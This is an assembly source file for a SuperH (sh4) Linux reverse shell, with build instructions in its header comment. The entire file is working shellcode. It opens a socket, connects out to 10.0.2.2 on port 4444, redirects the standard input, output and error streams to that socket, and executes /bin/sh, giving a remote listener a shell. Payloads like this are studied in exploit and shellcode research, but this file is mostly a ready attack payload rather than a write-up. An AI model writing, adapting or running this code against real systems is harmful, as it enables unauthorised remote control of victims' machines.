/*
 * SuperH reverse shell
 *
 * To generate:
 *    sh4-linux-gnu-as reverse_shell.s -o reverse_shell.o
 *    sh4-linux-gnu-ld reverse_shell.o -o reverse_shell
 */

	.global _start
	.text

_start:

create_socket:			! int socket(int domain, int type, int protocol)
	mov #85, r3
	shll2 r3		      ! 340 - syscall number
	mov #2, r4
	mov #1, r5
	xor r6, r6
	trapa #19	

start_connection:		! int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	add #2, r3		    ! 342 - syscall number
	mov r0, r4
	mova @(36, pc), r0
	mov r0, r5
	mov #16, r6
	trapa #19

dup_fds:			      ! int dup2(int oldfd, int newfd)
	nop
	mov #63, r3		    ! 63 - dup2()
	xor r5, r5		    ! initialize r5 for dup2

loop:
	trapa #19
	add #1, r5
	mov r5, r0
	cmp/eq #3, r0
	bf loop

exec_sh:
	mov #11, r3		    ! call number for execve
	mova @(18, pc), r0
	mov r0, r4
	xor r5, r5
	xor r6, r6
	trapa #19


sockaddr_struct:
	.word 2			      ! AF_INET - 2
	.word 0x5c11		  ! Port - 4444
	.byte 10,0,2,2
str:
	.string "/bin/sh"
